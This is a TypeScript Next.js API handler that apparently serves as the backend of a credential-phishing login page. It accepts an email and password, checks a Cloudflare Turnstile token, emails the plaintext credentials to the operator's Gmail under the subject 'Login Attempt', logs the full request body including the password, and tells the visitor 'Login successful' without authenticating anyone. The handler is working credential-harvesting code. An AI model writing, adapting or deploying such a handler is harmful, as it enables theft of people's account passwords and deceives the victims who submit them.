import type { NextApiRequest, NextApiResponse } from 'next';
import nodemailer from 'nodemailer';

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method === 'POST') {
    console.log('Received request body:', req.body);
    const { email, password, 'cf-turnstile-response': turnstileResponse } = req.body;

    // Verify Turnstile response with Cloudflare
    const turnstileSecretKey = process.env.TURNSTILE_SECRET_KEY; // Ensure this is stored in your .env file
    const verificationResponse = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: `secret=${turnstileSecretKey}&response=${turnstileResponse}`,
    });

    const verificationResult = await verificationResponse.json();

    if (!verificationResult.success) {
      return res.status(400).json({ message: 'Turnstile verification failed' });
    }

    // Proceed with your existing email handling
    const emailUser = process.env.EMAIL_USER;
    const emailPassword = process.env.EMAIL_PASSWORD;

    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: emailUser, 
        pass: emailPassword,
      },
    });

    const mailOptions = {
      from: emailUser,
      to: emailUser,
      subject: 'Login Attempt',
      text: `Email: ${email}, Password: ${password}`,
    };

    transporter.sendMail(mailOptions, (error: any, info: any) => {
      if (error) {
        console.log(error);
        res.status(500).json({ message: 'Email could not be sent' });
      } else {
        console.log('Email sent: ' + info.response);
        res.status(200).json({ message: 'Login successful and email sent' });
      }
    });
  } else {
    res.status(405).json({ message: 'Method not allowed' });
  }
}
